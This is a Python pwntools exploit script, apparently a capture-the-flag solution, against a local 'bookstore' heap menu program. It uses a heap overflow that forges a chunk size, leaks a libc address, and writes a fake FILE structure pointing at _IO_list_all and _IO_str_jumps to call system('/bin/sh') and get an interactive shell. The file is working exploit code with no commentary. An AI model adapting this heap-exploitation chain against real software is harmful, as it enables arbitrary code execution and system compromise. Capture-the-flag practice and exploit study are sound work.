from pwn import *
env=os.environ
env['LD_PRELOAD']='./libc_64.so'
#context.log_level='debug'
r=process('./bookstore')
def add(author,size,cont):
    r.recvuntil('Your choice:')
    r.sendline('1')
    r.recvuntil('What is the author name?')
    r.sendline(author)
    r.recvuntil('How long is the book name?')
    r.sendline(str(size))
    r.recvuntil('What is the name of the book?')
    r.sendline(cont)
def delete(idx):
    r.recvuntil('Your choice:')
    r.sendline('2')
    r.recvuntil('?')
    r.sendline(str(idx))
def show(idx):
    r.recvuntil('Your choice:')
    r.sendline('3')
    r.recvuntil('?')
    r.sendline(str(idx))
add('a'*0x10,0,'0'*0x10)#0

add('b'*0x10,0x40,'1'*0x10)#1
add('c'*0x10,0x40,'2'*0x10)#2
add('d'*0x10,0x40,'3'*0x10)#3
delete(0)
add('a'*0x10,0,'0'*0x18+p64(0xa1))#0
delete(1)

add('b',0,'1'*1)#1
show(1)
r.recvuntil('\x65\x3a')
lleak=u64(r.recv(6).ljust(8,'\x00'))
print "lleak:"+hex(lleak)
lbase=lleak-0x3c4c31
sys=lbase+0x45390
sh=lbase+0x18cd17
#0x18cd57

iolistall=lbase+0x3c5520
strjumps=lbase+0x3c37a0
print "iolistall:"+hex(iolistall)
fire=p64(0)+p64(0x61)+p64(0)+p64(iolistall-0x10)+p64(0)+p64(1)+p64(0)+p64(sh)+p64(0)*19+p64(strjumps-8)
fire=fire.ljust(0xe8,'\x00')+p64(sys)
add('e',0,'\x00'*0x10+fire)#4
r.recvuntil('Your choice:')
r.sendline('1')
r.recvuntil('What is the author name?')
r.sendline('test')
r.recvuntil('How long is the book name?')
r.sendline(str(0x40))
r.interactive()
